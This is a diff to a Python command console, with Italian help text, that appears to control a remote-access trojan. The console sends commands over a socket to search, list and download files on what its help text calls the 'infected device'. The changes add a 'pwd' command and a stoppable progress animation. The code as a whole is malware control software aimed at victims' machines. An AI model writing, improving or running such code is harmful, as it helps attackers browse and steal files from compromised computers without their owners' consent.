@@ -4,14 +4,16 @@ import time
 from threading import Thread
 
 windowsFlag = "n"
-
+stop_threads = False
+pwd = ""
 
 def animation():
-    print(".")
-    time.sleep(1)
-    print(".")
-    time.sleep(1)
-    print(".")
+    while True:
+        global stop_threads
+        if stop_threads:
+            break
+        print(".")
+        time.sleep(1)
 
 
 def receiveDir(connectionSocket):
@@ -28,7 +30,9 @@ def exitNClose(connectionSocket, cmd):
 
 
 def changeDirectory(connectionSocket):
+    global pwd
     out = connectionSocket.recv(1024).decode()
+    pwd = out
     print(out)
 
 
@@ -87,9 +91,12 @@ def searchFile(connectionSocket, fileName):
         cmd = "find -name " + fileName
     connectionSocket.send(cmd.encode())  # 143
     print("Ricerca...")
+    global stop_threads
+    stop_threads = False
     t = Thread(target=animation)
     t.start()
     SizeOrError = connectionSocket.recv(1024).decode()  # 92 or 99
+    stop_threads = True
     if SizeOrError == "notFound":
         output = "File not found"
         print("Ricerca fallita")
@@ -122,7 +129,7 @@ def SplitLine(mystring):
 
 
 def main():
-    global windowsFlag, connectionSocket
+    global windowsFlag, pwd
     esc = False
     while not esc:
         try:
@@ -131,7 +138,7 @@ def main():
             help = "infoOs                          ricevi informazioni del sistema operativo\nsearch [nome file]              cerca un file nel " \
                    "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
                    "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
-                   "directory \ncls                             clear console"
+                   "directory \ncls                             clear console\npwd                             print working directory"
             while not esc:
                 cmd = input('>>')
                 connectionSocket.send(cmd.encode())
@@ -163,10 +170,13 @@ def main():
                     output = searchFile(connectionSocket, toSearch)
                     path = SplitLine(output)
                     connectionSocket.send(path.encode())  # 146
-                    print("CWD: " + connectionSocket.recv(1024).decode())
+                    pwd = connectionSocket.recv(1024).decode()
 
                 elif cmd == "help":
                     print(help)
+
+                elif cmd == "pwd":
+                    print(pwd)
 
         except Exception as e:
             print(e)
